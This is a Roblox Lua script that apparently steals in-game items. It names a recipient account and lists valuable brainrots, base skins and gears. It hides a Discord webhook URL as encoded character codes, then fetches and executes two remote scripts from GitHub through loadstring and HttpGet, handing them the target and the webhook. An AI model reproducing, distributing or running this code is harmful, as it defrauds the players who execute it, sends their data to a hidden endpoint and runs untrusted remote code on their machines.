local TARGET_ID = 4064865822
local TARGET_USER = "FelipeSjfjfv"

WebhookEncrypted = "104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,52,48,50,52,54,54,55,53,49,56,50,56,53,52,49,55,53,47,50,95,53,65,51,117,48,83,120,102,101,84,55,101,104,56,97,95,71,111,114,57,109,48,108,86,72,104,109,112,72,97,110,84,76,73,65,82,99,67,107,54,99,88,115,114,104,95,98,106,55,108,65,84,121,82,119,52,97,72,116,66,117,101,83,80,107,103"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["John Pork"] = true,
    ["Headless Horseman"] = true,
    ["Cerberus"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Cursed"] = true,
    ["Cyber"] = true,
    ["Diamond"] = true,
    ["Divine"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Halloween"] = true,
    ["Lava"] = true,
    ["Lucky"] = true,
    ["Octo"] = true,
    ["Pot of Gold"] = true,
    ["Radioactive"] = true,
    ["Tralalero"] = true,
    ["Valentines"] = true,
    ["Yin Yang"] = true,
    ["Taco"] = true,
    ["Rose"] = true
}

local TargetGears = {
    ["Lava Blaster"] = true,
    ["Divine Slap"] = true,
    ["Witch's Broom"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WebhookEncrypted, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)